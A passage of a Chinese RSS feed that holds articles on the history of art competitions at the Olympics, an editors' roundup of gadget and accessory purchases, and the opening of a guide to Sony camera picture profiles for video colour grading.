data-original=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_r.jpg\"><figcaption>让·雅可比，《角球》</figcaption></figure><p>因为上述种种原因，参加奥运会的艺术家们，与其说是艺术家，不如说是「符合奥运精神的资深艺术爱好者」。毕竟，早年间的奥运会非常强调「奥运精神第一，比赛成绩第二」，职业艺术家多仰赖销售作品为生，而奥运会又不想参赛者和钱挂钩，尤其是不想看到赢了金牌的艺术家作品价格变贵。所以当激进的保守派奥委会主席艾弗里·布伦戴奇上任后，他坚持要维护奥运会的纯洁，并力主将全部艺术赛事一次性开除出了奥运会——即便他自己也曾在1932年参与了奥运文学奖的赛事（并没有获得奖牌）。从那以后，这些艺术赛事就再也没有回归奥运大家庭。</p>\n<p>从1912年到1948年的7届奥运会中，总共有23个国家的艺术家赢得了总计147枚奖牌，其中获奖最少的国家是摩纳哥，1枚铜牌，意大利和法国这两个文化大国在金牌榜和总奖牌榜上均并列第二，分别是5枚金牌和14枚奖牌。最终赢得7届奥运会艺术项目金牌和奖牌最多的并不是如今奥运会的大热门中国、美国和俄罗斯，而是德国，他们总共赢得了7金、7银、9铜，总计23枚奖牌。在最后一届包含艺术奖项的奥运会，1948年伦敦奥运会上，英国版画家约翰·科普利以73岁高龄赢得了版画银牌，成为了奥运史上年龄最大的奖牌获得者。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"850\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_r.jpg\"><figcaption>蔡国强主持创作的「大脚印」是08奥运开幕式最早敲定下来的方案之一</figcaption></figure><p>奥运艺术赛事虽然就此打住了，却以另一种形式延续了下来，那就是花样翻新的开幕式和闭幕式。单就在北京举办的2008年夏季奥运会的开幕式来说，就是众多资深艺术工作者合力的成果。除了广为人知的总导演张艺谋，副导演张继钢、陈维亚管的是各种繁杂的事情。樊跃、王潮歌的大型空间演出经验丰富，蔡国强（大脚印焰火），陈丹青（滚动画轴），陈岩和韩立勋（美术总设计）、陈其钢（音乐）……等等。</p>\n<p>去年年底我在故宫看了蔡国强的个展「远行与归来」，里面有他以故宫收藏的《冰嬉图》为灵感创作的《银河嬉冰》，他也会继续为2022年冬奥会出工出力。或许咱可以借此想象，如果现在的奥运会还有艺术赛事，艺术家们会带来什么样的作品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"2520\" class=\"origin_image zh-lightbox-thumb\" width=\"4032\" data-original=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_r.jpg\"><figcaption>蔡国强的《银河嬉冰》</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_b.jpg\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_r.jpg\"><figcaption>《银河嬉冰》局部</figcaption></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/weng-xin-79?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">翁昕</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/396372387?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 073｜少数派的编辑们最近买了啥？","date":"2021-08-05 09:32:52","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@张奕源 Nick：得到阅读器 Pro</h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>参考价格：2199 元</li>\n</ul>\n<p>除了 TWS 耳机，其实我电子书也没少买（但书却没读几本）。刚好最近我有一些书和材料要读，手头的旗舰级阅读器 Kindle Oasis 的电池已经严重老化，所以就考虑搞个新的。得到阅读器我关注已久，于是趁着这个机会下了单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p49tb34t8oic3r47g.jpeg\"></figure><p>我这次对于电子书的需求点其实很明确：要有足够大的萤幕尺寸，便于阅览 PDF；要有开放的系统，最好能安装第三方应用，便于阅读各种格式的书籍；最好能支援手写，便于我阅读时划线做笔记。以上三点，得到阅读器 Pro 恰好都具备，价格也在我的预期之内，所以就买了它。</p>\n<p>得到阅读器 Pro 是和文石合作生产的，恰巧我之前用过一段时间公司的一个旧款文石阅读器，体验不算好。但得到阅读器 Pro 的使用感受却和老款文石截然不同，反应速度很快，显示和操作逻辑也都清楚了不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4a5b34t8oam7hrig.jpeg\"></figure><p>我稍微研究了一下，得到阅读器 Pro 的原型应该是文石 Nova3，并在此基础上多了一套得到阅读的专属书架和定制 UI。我此前在得到上也买了一些书，刚好可以一并读了，加上阅读器还附赠一年的得到电子书会员，比直接买文石 Nova3 划算许多。当然，由于产品原型来自文石，所以得到阅读器 Pro 的阅读功能已经非常成熟，排版设置、PDF 解析和裁边、全局手写笔记等都不在话下。</p>\n<p>值得一提的是得到阅读器 Pro 的保护壳。这款外壳需要额外购买，装上之后可以为阅读器提供额外的侧面翻页按键，我就是冲着这个按键才购买了这款保护壳。翻页按键能让阅读时的翻书动作更简单，不用再去点按萤幕，而且多出的空间也能安放拇指，使握持更舒适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4adb34t8o8vq45e0.jpeg\"></figure><p>不过，由于这款电子书搭载的是 Android 系统，在获得扩展性的同时也牺牲了一定的续航，天天看书的话大约用个三五天就要充电一次，虽然算不上频繁，但跟半个月到一个月才需要充一次的 Kindle 相比还是有着明显区别，需要稍微留意一下电量。</p>\n<p>此外，得到还推出了一款得到阅读器 Max，产品原型应该是文石 Note Air。Pro 和 Max 在 SoC 及系统配置上的差别不大，这篇体验也可以作为参考：</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/66487\" target=\"_blank\">走向精装的电纸书：得到阅读器 Max 上手体验</a>》</li></ul>\n<h2>@北鸮：Skog-Reboot by Percent Studio 机械键盘套件</h2>\n<ul>\n<li>入手价格：2700 元</li>\n<li>入手渠道：二手购入</li>\n</ul>\n<p>客制化键盘圈有一个我觉得还挺不好的习惯：先款团购。虽然理论上和预购其他商品也没什么区别，但由于设计复杂程度、制作工艺、体量、工厂水平、开团方管理能力等等的差距，客制化键盘、键帽甚至轴体的团购都经常延期。对于爱好者来说，等待的时间令人兴奋，但更多的是带来折磨。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/6e1aec2416cb4a14fcab547578411040.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/9a314843ec058cb9f35a51fdd6fb4e6b.png\" alt=\"\"></figure><p>这把 Skog-Reboot 其实是开团时我就相中的套件。一方面，我非常喜欢 Percent Studio 的设计，他们之前设计的 Canoe 系列套件也是在国内外广受好评；另一方面，我一直想搞一把大的：80% 配列，WKL 大门牙，铝坨坨外壳，最好还是省事的热插拔。但很可惜，当时我并没有什么闲钱，只能加了群，看它开团再看它截团。万万没想到，因为种种原因，Skog-Reboot 的实物键盘表现似乎不如团购预期，全新未拆的热插拔蓝牙双模版本在二手市场的价格跌到了焊接单模的价格。突然有了闲钱的我一个冲动就去收了一把 Space Cadet 配色的现货回来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4btb34t8po8490sg.jpeg\"></figure><p>由于先前种种评论的预防针，我对 Skog-Reboot 的声音和手感表现本来也没什么期待，我只当那个缓冲结构不存在，买了一把刚性结构的键盘就好。不过上手组装使用之后，我发现这把键盘的打击手感也没有那么不堪，虽然没有那么软弹但也不至于像是敲钢板，更大的问题可能出在打字音没有其他经典的 Gasket 结构键盘那么干净柔和上。我的解决办法非常简单粗暴：给它配上手里本身沙沙声就最大的线性轴 Kailh Novelkeys Cream，我完全放弃声音不就得了吗？（毕竟我<s>那么多键盘</s>写东西还戴耳机。）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/9f584440b2376c8797dba966c0250d5d.png\"></figure><p>用了一两周下来，这把键盘的外观和手感都完全满足我的要求。虽然这两千多块花得我后知后觉地心疼，但这把键盘的做工和设计也算是对得起这个价格，成功推动我在脱坑的路上迈出了一大步。接下来就是看看手里的其他键盘要卖掉哪个的时候了……</p>\n<h2>@张奕源 Nick：OnePlus Buds Pro</h2>\n<ul>\n<li>入手渠道：厂商赠送</li>\n<li>参考价格：799 元</li>\n</ul>\n<p>本「TWS 大户」又来搞耳机了，这次是 OnePlus Buds Pro。</p>\n<p>在产品发布之前，张老板把这款耳机的定位拔得很高，所以我也一直在等着产品正式开售。没想到我派在保密阶段就提前拿到了产品，也就给了我更多时间来体验一下这款一加在 TWS 领域的旗舰之作。</p>\n<p>OnePlus Buds Pro 的外观很有特点，我在拿到的第一时间就觉得很像方形的糖盒。不过，它的实际手感跟轻飘飘的糖盒完全不同，略有点沉甸甸的，很有分量。耳机从外到内都采用了以类肤质为主的材质，握柄部分则为银色哑光，形成了一种奇妙的撞色。在近期我用过的 TWS 耳机里，OnePlus Buds Pro 的综合性能虽然未必位列第一，但外观上肯定是最独特的一个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p495b34t8o8vq45dg.jpeg\"></figure><p>OnePlus Buds Pro 既然定位旗舰，各项软硬体配置也自然「给满」，从 40 dB 深度降噪到 LHDC 音质，再到通话降噪和长续航，乃至无线充电与杜比全景声——当下能在主流 TWS 耳机上见到的配置，OnePlus Buds Pro 一应俱全。</p>\n<p>我的主要关注点在于这款耳机的降噪能力，重点测试场景则是地铁。根据我使用 TWS 耳机的经验，「能否通过地铁这关」直接决定了一款降噪耳机的实际可用度。和飞机发动机频段稳定、发声持续的噪音不同，地铁里的噪音更为复杂——既有车辆运行本身产生的震动声，也有高速通过某些路段时摩擦铁轨产生的高频声，还有人挤人产生的纷乱和嘈杂声。经过我的实测，OnePlus Buds Pro 在地铁里降噪效果非常不错，听播客也不需要开到很大的声音（甚至进出地铁前后都不用改变音量大小），能让收听体验保持在很舒适的状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p49db34t8po8490s0.jpeg\"></figure><p>后来我研究了一下，发现除了 OnePlus Buds Pro 本身的降噪算法不错之外，这款耳机在造型上也跟我的耳道很契合，加上类肤材质也很贴合皮肤，佩戴之后耳机可以紧紧「吸」在我的耳中，从物理上就隔绝了不少噪音，进而提升了整体的降噪效果。但其类肤质的设计也有个缺点——耳机本身很容易残留汗和油渍，每次摘下之后都需要先擦一擦才能放进盒子里，导致我用的时候总有点小心翼翼。</p>\n<p>在一加手机用上 ColorOS 之后，一加的耳机也直接使用了 OPPO 的 HeyMelody 应用来进行管理。我因为之前在用 OPPO 耳机，倒也因此不必再多下一个 app，还挺省事。HeyMelody 可以调整耳机的各项参数，具体玩法已经在 <a href=\"https://sspai.com/post/67090\" target=\"_blank\">这篇文章</a> 里写过，这里我就不赘述了。</p>\n<p>总体来说，OnePlus Buds Pro 很适合还没入坑 TWS 的朋友作为自己的入门产品，它从配置到性能都是旗舰级别，799 元的价格也差不多是这一代 TWS 旗舰的均线，入手之后能踏实用个两三年。</p>\n<h2>@包包呀嘿：COSTAR <strong>天生一对·圆满项链</strong>\n</h2>\n<ul>\n<li>入手价格：月亮 / 太阳单件最低 ￥323 到手，情侣款最低 ¥515 到手</li>\n<li>入手渠道：<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=651757789077\" target=\"_blank\">少数派商店</a>\n</li>\n</ul>\n<p>马上就要七夕了，有没有提前做好准备？我自己的计划是送一件有心意又独一无二的礼物🎁，不用太实用，毕竟在这个浪漫的日子应该去制造一些有情调的仪式感，送饰品是再好不过了，至于送什么，我想一对美丽的情侣项链总不会错吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4dlb34t8po8490t0.jpeg\"></figure><p>COSTAR 刚刚发布了新款，天生一对 · 圆满项链，就很符合我送礼物的思路。它选用了深海新西兰 4A 级鲍鱼贝，每一片都是独一无二、浑然天成的天然纹理。做成一对项链，一半是日，一半是月。拼在一起还是一个完整的圆，象征着圆满。日月的搭配，正如这对项链的名字一样，天生一对。日月长久，时光永在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4e5b34t8oic3r48g.jpeg\"></figure><p>它的包装也很走心，包装的从两侧拉开，日月项链在枝叶的掩映下出现，仿佛打开了一个小花园，是具有仪式感的小惊喜，非常适合作为礼物赠送，可以想像到对方打开信封的瞬间，露出惊喜的眼神，会很有成就感吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4elb34t8oam7hrjg.gif\"><figcaption>来自官方图</figcaption></figure><p>天然贝壳的纹理，确实有一种神秘和迷人的感觉，梦幻的极光色，从碧绿到宝蓝，在光的加持下，反射出不同的色彩，美丽💅。极简的造型更能衬托出它的纯粹，也容易搭配。无论休闲的白 T 还是美丽的小裙子都能搭配在一起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/dff1aabd7556d3f94e12edbf2990a191.jpg\"><figcaption>实拍</figcaption></figure><p>送给心爱的人，也送给自己，是一个很好的选择，既能见证彼此的感情，又有得到新礼物的喜悦，是一个富有小心机的浪漫。它没有过多的装饰，不浮夸，也不跳脱，还能纪念彼此的心意，果然饰品是富有仪式感和纪念意义的存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2f5089ffef919b67c21e735a020937a1.jpg\"><figcaption>实拍</figcaption></figure><p>另外，它的链条也很有细节，有三个延长的扣圈，长度可以自由调节。不过对比起来，月链比较长，日链短一些，当然吊坠也可以拆下来互换链条。</p>\n<p>如果是当作项链佩戴的话，短链更适合优雅的风格，戴在锁骨附近，和皮肤搭配起来也很美丽，不愧是年轻的 body😳。相比之下，长链更适合和衣服一起搭配。穿个简单的 T恤，经典白T或者格纹衬衫，当作搭配的装饰也非常合适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/0725604d02734dcdeb98c89817e1db11.jpg\"><figcaption>来自官方图</figcaption></figure><p>抛开它是一对项链的定位，也可以把它就当作日常的饰品，不是送给另一半，而是送给自己，七夕多爱自己也没什么错吧🌚？你可以选择两条一起叠戴，日月都在自己身上，可能会有一种拥有整个宇宙的错觉，听起来也是一个不错的 idea 呢。链条在手腕上多绕几圈，还可以变成手链，我自己的感觉是日链更小巧，比较适合女孩子的手腕，不过一起都在手腕上叠戴也不成问题。</p>\n<p>饰品这种注重细节和搭配的物品，总能包容大家的各种小心思，想怎么搭配都可以跟随自己的想法，COSTAR 的这对项链绝对称得上随心百搭。</p>\n<h2>@Clyde：摩斯维小米 11 Pro 无边框手机壳</h2>\n<ul>\n<li>入手价格：35.9 元</li>\n<li>入手渠道：京东自营旗舰店</li>\n</ul>\n<p>如果不考虑 iPhone，为了国内生活便利再怎么也得准备一台搭载 MIUI 的小米手机。在线下实际上手过一次小米 11 Pro 之后，感叹其相比手中的 <a href=\"https://sspai.com/post/67291\" target=\"_blank\">Redmi K40 Pro+</a> 甚至此前的 <a href=\"https://sspai.com/post/64817\" target=\"_blank\">小米 11</a> 在质感上的巨大进步，因此很快也将 MIUI 备机升级到了小米 11 Pro。</p>\n<p>不过我早就说过，我对小米 11 全系的后置摄像头设计都非常难以接受；在「手机要不要带壳使用」这个问题上，我一直以来也都相信那句至理名言 —— Better safe than sorry，小米 11 Pro 并不是一台便宜的备机，好好保养，小米 MIX 4 出了之后没准还能卖个好价。</p>\n<p>综合考虑，是时候给小米 11 Pro 挑个手机壳了。在阿里巴巴、淘宝和京东逛了一圈，最后我还是选择了此前在小米 10 上选择过的摩斯维。</p>\n<p>摩斯维这款手机壳后盖采用了磨砂设计，手感舒适的同时搭配灰、黑配色机身非常好看 —— 实际上去年正好也是在小米之家看到店员在搭配小米 10 国风雅灰用这款壳，当时正被小米出厂清水壳恶心到不行的我才立马打听到了这款手机壳的品牌。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4gtb34t8oic3r490.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4hdb34t8o8vq45fg.jpeg\" alt=\"\"></figure><p>所以小米 11 Pro 黑色版本搭配这款壳观感也不差：黑色版本不带壳状态下镜面后盖光彩照人但非常容易收集指纹，套壳之后不仅增加了手感，还保留了几分机身镜面后盖的朦胧观感。</p>\n<p>除了好看，摩斯维这款手机壳让我在经历好几款小米手机之后依然复购的最重要原因，则是它所谓的「无边框设计」。一般而言手机壳都会为原本就已经非常大的手机增加额外宽度，@路中南 据说非常受不了这一点。摩斯维的做法是将机身两侧手机壳的部分「砍掉」，只保留上下和四角。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4htb34t8oam7hrl0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4idb34t8oic3r49g.jpeg\" alt=\"\"></figure><p>不得不说还是非常佩服一开始想出这种创意的人——对小米 11 Pro 这种曲面大屏手机来说，这种设计既能保证带壳之后不增加横向宽度，又能完整保留曲面部分原有的顺滑手感；保证边角包裹的同时，在手机壳主要保护的跌落损坏区域中牺牲了不那么关键的部分，太妙了。</p>\n<h2>@HarveyJanson：公牛 65W PD 快充插座 </h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>入手价格：¥154（¥159 - ¥5），7/1 – 7/31 京东只要 ¥144</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/03/5c1f560f94687714fbb878aa73762c81.jpeg\"></figure><p>之前用公牛自带收纳盒的插座，结果遇到了几个问题。首先是开关莫名其妙卡住了，位置也扭曲了，导致插排彻底关不上了。其次是去年年中购入了港版 Switch，自带收纳盒的高度不够高，装不下 Switch 插头加转换器，使得盖子形同虚设。第三是孔位不够富裕，虽然有专门插 MacBook Pro 大砖头的侧面孔位，但刨去三个 USB 口，就只有五个五头插座，笔记本、显示器、Switch、PS5 插满后就只剩一个口机动，如果插头形制特殊，甚至连这最后一个孔也没了（之前接宜家的三充电位无线充电器就是这情况）。</p>\n<p>年初的时候换了 M1 MacBook Air，事实上已经不需要 87W 的充电功率了。不用纠结「大白砖头」，可供选择的插排也一下多了起来。后来偶然看到公牛出了这款带 65W PD 充电口的插排，孔位有比较合理，就直接下单了。当然，下单之前我也规划了一下各个插口的布置，大致如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16253197364984.jpeg\" alt=\"\"></figure><p>当然，这都是理想化的布局。受制于个别插头的体积（说的就是港版 Switch 加转换器那个巨大无比的插头），实际布局做了微调如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16253197366246.jpeg\" alt=\"因为没了自带收纳盒，就上网买了个这个，开口够多，就是都不大\"><figcaption>因为没了自带收纳盒，就上网买了个这个，开口够多，就是都不大</figcaption></figure><p>换这个插排的好处显而易见：由于 MacBook 充电不再占用一个插座，后备插座的数量增加了，能更好地应对弹性需求。由于我个人同时需要接电的设备终归是有限的，这个配置在相当长一段时间里应该都够用，哪怕换了电动升降桌，也有富余。</p>\n<p>要说缺点的话，其实就一条：除了 65W 充电口之外，两个 USB-A 口充电时会有延迟（接入手机等设备会隔个几秒才开始充电）或波动（接入设备后充电时断时续，有时甚至不充电）等情况，但随着日常使用，完全冲不进去电的情况倒也并没有发生。</p>\n<p>还有一个对我个人而言算不上缺点，但有些读者可能会介意的地方：两个 USB-A 口，单口输出最大 18W；同时输出，两 USB-A 口相加最大只有 15W；如果是 A + C，则为 18W + 45W；如果三口同时输出，C + (A + A) 的功率为 45W + 15W。我个人对快充没有需求，MacBook Air 的话 45W 也完全足以喂满。所以如果对输出功率比较介意，建议慎重购买。</p>\n<p>为方便理解，输出功率组合情况见下表：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th> </th>\n<th>+ 0</th>\n<th>+ USB-C</th>\n<th>+ USB-A1/A2</th>\n<th>+ USB-A1 + USB-A2</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>USB-C</td>\n<td>65W</td>\n<td>-</td>\n<td>45W</td>\n<td>45W</td>\n</tr>\n<tr>\n<td>USB-A1</td>\n<td>18W</td>\n<td>18W</td>\n<td>共享 15W</td>\n<td>-</td>\n</tr>\n<tr>\n<td>USB-A2</td>\n<td>18W</td>\n<td>18W</td>\n<td>共享 15W</td>\n<td>-</td>\n</tr>\n</tbody>\n</table></figure><h2>@100gle: IQUNIX L-80 机械键盘 </h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>参考价格：696 元</li>\n</ul>\n<p>上一次使用机械键盘还是在 2019 年，那时候我刚入手的还是机械键盘入门款的 iKBC C87 红轴。第一次接触机械键盘时会觉得手感和普通的薄膜键盘有那么些不一样，清脆有力的敲击以及回弹无不让我为机械键盘为之着迷。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/04/f150601154d909ebab7390455730ad32.png\"><figcaption>图源京东商城</figcaption></figure><p>但随着使用的时间比较长，加之我手头的 iKBC C87 这款机械键盘价格相对便宜，在敲击键盘的过程中容易产生金属碰撞时的那种「锵锵」的空腔回弹声，虽然在写文章敲代码时似乎并不影响我，但如果是在不戴降噪耳机遮蔽噪音的情况下还是相当恼人。</p>\n<p>所以没多久之后我就将手头的 iKBC C87 以半价的价格在闲鱼上售出回血，最后购置了一直用到现在的 68 键的宁芝静电容键盘 Plum。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/d030d4a71b8f97e27139e5983d6a978c.jpeg\"></figure><p>我经常性地将这款键盘来回带着上下班并使用，但也因为兼顾便携性，所以该键盘上所缺少的键位往往都需要通过组合键来实现，对于个人的心智以及肌肉记忆是个很大的挑战；加之后续我为了跟小伙伴们更好的「开黑」玩游戏，于是入手了联想的 R9000P 游戏本之后，但又不想每天都背着个键盘上下班，于是就在 618 的第二天（不要问我为什么不在 618 当天入手，<s>问就是突然想买</s>）入手了 IQUNIX 家的 L-80。</p>\n<p>IQUNIX 由称为「铝厂」，因为它家的设备大多数都以铝材为主。当然选购 IQUNIX L-80 当然主要还是因我觉得颜值还是不错的（没错，我为颜值买单）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/afe356cd4f65088d65795df8b330ae8b.png\"><figcaption>图源京东商城</figcaption></figure><p>除了外观之外，L-80 也具备了大多数的机械键盘所具备的功能，比如：有线无线连接、二段式脚撑、全键无冲等之外，它让我比较满意的几个点在于：</p>\n<ul>\n<li>适配 MAC 键位（我是 Windows、macOS 和 Linux 三系统操作党）</li>\n<li>赶上手机的 4000mAh 电池容量即是在无线模式下也能使用很久</li>\n<li>出厂即是 PBT 键帽不容易打油</li>\n<li>支持热插拔轴体</li>\n</ul>\n<p>同时这次我也选购的是来自于国产的 TTC 金粉轴体，手感对比我之前的 iKBC C87 和目前的在用的宁芝 Plum 来说（以下为主观玄学体验环节）：</p>\n<ul>\n<li>反应更加灵敏，敲击对指尖的压力较小；</li>\n<li>按键清脆且回弹有力，感觉介于机械轴体与静电容轴之间。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/ee17584b8b0d56eb1e81a78ab2038104.jpeg\"></figure><p>不过 L-80 也有一些小瑕疵的地方，比如在有线连接和无线连接之间切换时需要将键盘抬起并通过底部的开关进行切换，不如直接通过组合按键来得直接。</p>\n<p>并且，即便是在不打开脚撑的情况下，键盘自身的角度（目测在 20° 左右）及高度对手腕来说可能压力大一些，长时间最好需要配备一个腕托。</p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68115"},{"title":"为了更好地给所摄视频调色，我整理了这份图像配置文件学习笔记","date":"2021-08-05 07:56:18","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>无反相机的出现是革命性的。除了取景方式的改变，我觉得，用户感知更明显的是视频功能的下放。在无反相机兴起之前，视频录制对于普通人来说并不友好，但是随着无反相机的普及，带来的是越来越靠谱的对焦系统，以及丰富的图像配置文件选项（Picture Profile，简称PP），让用户有着更大的调色选择空间。</p>\n<p>最近我也在学习使用索尼微单进行视频的拍照，经过一段时间的使用，对索尼微单的视频设置功能有一定的了解。下面就把自己使用过程中的「笔记」分享给大家。</p>\n<p>虽然我以手上的索尼微单作为蓝本，但是和其他品牌的无反相机也有一定的相似之处，我会尝试总结一些比较共性的内容，让不同品牌的「股东们」都能够有所收获。</p>\n<h2>图像配置文件的位置</h2>\n<p>因为索尼相机菜单是出了名的难找。我就顺便给大家说一下图像配置文件的位置啦。</p>\n<p>有两个位置可以找到更改图像配置文件的地方：</p>\n<ol>\n<li>如果没有对图像配置文件所见的位置进行大幅度的更改，点击「Fn」按钮 - 点击「PP」按钮 - 在左侧界面选择PP值。我手头上的机器只有 10 个 PP 值，具体 PP 值代表的含义，需要点击「＞」按钮进入二级菜单，在菜单可以看到相对应的色域等信息。</li>\n<li>用户点击「Menu」按钮 - 点击「影像质量/影像尺寸1」- 翻到第 12 页，点击「图像配置文件」</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/33135d1b73096f8f95418afe4851055e.gif\"><figcaption>不同PP值能够对视频风格做出调整</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/02989aa86e86b8d0ff4cdd41df5fa9ef.jpg\"><figcaption>二级菜单可以对伽马、色彩模式（色域）进行调整</figcaption></figure><h2>图像配置文件存在的意义</h2>\n<p>在了解一系列的参数之前，我们要知道图像配置文件存在的意义。开门见山地说，图像配置文件的存在是为了我们在不同的使用条件下找到最适合自己的「视频风格预设」，提升自己的拍摄和后期编辑效率，并最终实现效果的最优化。比如说：</p>\n<p>如果你需要简单地记录生活，对记录的便捷性比较看中，你就可以直接选择以 Rec.709 的图像配置进行录制，曝光和对焦控制好，就可以即拍即用。</p>\n<p>如果你在拍摄视频作品，有比较高的调色需求，你就可以选择以 S-Log2 或者 S-Log3 的图像配置进录制，以期获得更大的后期调色空间。</p>\n<p>如果你对视频的调色还不是很熟悉，但是希望可以进行一点初级的调色，你可以选择 HLG 的图像配置进行录制，在实用性和时效性上取得一个平衡。</p>\n<p>当然，决定编辑效率和视频质量的因素不仅仅是图像配置文件，还需要对色深，色度采样，色彩空间（色域）进行一定的设置，才能达到最优的效果。</p>\n<h2>色深和色度采样</h2>\n<p>在我们了解色彩配置文件之前，我们需要先了解另外的两个概念：「色深」和「色度采样」。这两个概念其实很常见，也常常是一对出现的。当别人说，这台机器能够拍摄「8 bit 4:2:0」或者能拍摄「10 bit 